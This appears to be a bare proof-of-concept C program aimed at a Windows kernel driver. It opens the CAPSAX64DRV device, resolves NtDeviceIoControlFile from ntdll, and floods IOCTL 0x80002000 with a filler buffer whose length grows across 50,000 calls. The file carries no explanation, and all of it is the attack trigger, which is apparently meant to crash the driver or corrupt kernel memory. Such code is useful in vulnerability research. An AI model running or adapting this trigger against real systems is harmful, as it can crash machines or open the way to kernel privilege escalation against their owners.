#include<stdio.h>
#include <windows.h>
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
HANDLE hDriver;
IO_STATUS_BLOCK p;
typedef NTSTATUS(NTAPI* NtDeviceIoControlFile)(
    HANDLE           FileHandle,
    HANDLE           Event,
    PVOID            ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG            IoControlCode,
    PVOID            InputBuffer,
    ULONG            InputBufferLength,
    PVOID            OutputBuffer,
    ULONG            OutputBufferLength
    );
int main() {

    hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\CAPSAX64DRV", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    ULONG dw;
    if (hDriver == INVALID_HANDLE_VALUE) {
        system("pause");
        return(-1);
    }
    LPCWSTR nt = L"ntdll";
    HMODULE hntdll = GetModuleHandle(nt);
    p = {};
    NtDeviceIoControlFile  tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, "NtDeviceIoControlFile");
    if (!tDeviceIoControl) {
        printf("[-] Fail to resolve ZwDeviceIoControlFile(0x%X)\n", GetLastError());
        system("pause");
    }
    DWORD lpFakeBuffer[0x2000] = { 0 };
    for (size_t i = 0; i < 0x2000/4; i++)
    {
        lpFakeBuffer[i] = 0x01010101;
    }
    for (size_t i = 0; i < 50000; i++)
    {
        tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x80002000, lpFakeBuffer, i, (PVOID)lpFakeBuffer, i);
    }
    return 0;
}
